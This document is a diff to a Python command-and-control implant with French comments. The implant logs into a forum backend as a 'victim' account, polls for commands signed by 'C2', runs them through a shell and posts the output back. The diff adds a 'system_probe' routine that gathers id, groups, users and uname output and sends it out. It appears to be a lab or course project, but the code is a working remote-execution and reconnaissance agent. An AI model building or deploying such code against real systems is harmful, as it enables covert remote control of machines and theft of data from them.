@@ -1,17 +1,19 @@
 import requests
 import time
 import subprocess
+import json
 
 
 # Config victime
-USER = "victime_2"          # nom de la victime (cible)
+USER = "victime_1"          # nom de la victime (cible)
 PASSWORD = "testtest"
-IP = "127.0.0.1"
+IP = "192.168.151.138"
 PORT = 6000                 # backend du forum
-MASTER = "C2"               # émetteur attendu (doit matcher [FROM=...])
+MASTER = "C2"             # émetteur attendu (doit matcher [FROM=...])
 
 POLL_INTERVAL_SEC = 2
 CMD_TIMEOUT_SEC = 60
+SYSTEM_PROBE_PREFIX = "__SYSTEM_PROBE__"
 
 
 def login(ip: str, port: int, user: str, password: str) -> str:
@@ -76,6 +78,28 @@ def parse_tagged_command(body: str, expected_from: str, expected_to: str):
         return None, None
 
 
+def run_system_command(command: str) -> str:
+    result = subprocess.run(
+        command,
+        shell=True,
+        text=True,
+        timeout=CMD_TIMEOUT_SEC,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+    )
+    return result.stdout.strip()
+
+
+def build_system_probe_payload() -> str:
+    data = {
+        "id": run_system_command("id"),
+        "groups": run_system_command("groups"),
+        "users": run_system_command("users"),
+        "uname": run_system_command("uname -a"),
+    }
+    return SYSTEM_PROBE_PREFIX + json.dumps(data)
+
+
 def main():
     token = login(IP, PORT, USER, PASSWORD)
 
@@ -120,17 +144,19 @@ def main():
                 print("Exit reçu, arrêt.")
                 break
 
+            if new_cmd.lower() == "system_probe":
+                try:
+                    output = build_system_probe_payload()
+                except Exception as e:
+                    output = f"[ERREUR SYSTEM_PROBE] {e}"
+
+                send_result(IP, PORT, token, output, seq)
+                time.sleep(0.3)
+                continue
+
             # exécuter la commande
             try:
-                result = subprocess.run(
-                    new_cmd,
-                    shell=True,
-                    text=True,
-                    timeout=CMD_TIMEOUT_SEC,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                )
-                output = result.stdout
+                output = run_system_command(new_cmd)
             except Exception as e:
                 output = f"[ERREUR EXEC] {e}"
 
